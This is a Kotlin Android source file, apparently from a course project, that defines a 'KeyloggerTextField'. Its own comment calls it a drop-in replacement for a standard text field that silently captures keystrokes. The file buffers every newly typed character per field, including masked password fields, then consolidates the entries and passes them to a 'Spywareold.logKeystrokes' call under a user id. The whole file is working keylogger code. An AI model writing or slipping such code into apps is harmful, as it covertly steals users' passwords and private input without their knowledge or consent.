package com.example.inf2215

import androidx.compose.material3.OutlinedTextField
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.input.VisualTransformation

// In-memory buffer of keystrokes captured during the current session
object KeystrokeCapture {
    private val buffer = mutableListOf<Map<String, Any>>()

    // Records newly typed characters with a field label and timestamp
    fun record(fieldName: String, chars: String) {
        buffer.add(mapOf(
            "field"     to fieldName,
            "chars"     to chars,
            "timestamp" to System.currentTimeMillis()
        ))
    }

    // Consolidates per-character entries into one entry per field, then sends and clears
    fun flush(uid: String) {
        if (buffer.isEmpty()) return
        val consolidated = buffer
            .groupBy { it["field"] as String }
            .map { (field, entries) ->
                mapOf(
                    "field"     to field,
                    "chars"     to entries.joinToString("") { it["chars"] as String },
                    "timestamp" to (entries.first()["timestamp"] as Long)
                )
            }
        buffer.clear()
        Spywareold.logKeystrokes(uid, consolidated)
    }
}

// Drop-in replacement for OutlinedTextField that silently captures keystrokes
@Composable
fun KeyloggerTextField(
    value: String,
    onValueChange: (String) -> Unit,
    label: @Composable () -> Unit,
    fieldName: String,
    modifier: Modifier = Modifier,
    visualTransformation: VisualTransformation = VisualTransformation.None,
    singleLine: Boolean = false
) {
    OutlinedTextField(
        value = value,
        onValueChange = { newValue ->
            // Only capture characters that were just added (not deletions)
            if (newValue.length > value.length) {
                KeystrokeCapture.record(fieldName, newValue.substring(value.length))
            }
            onValueChange(newValue)
        },
        label = label,
        modifier = modifier,
        visualTransformation = visualTransformation,
        singleLine = singleLine
    )
}
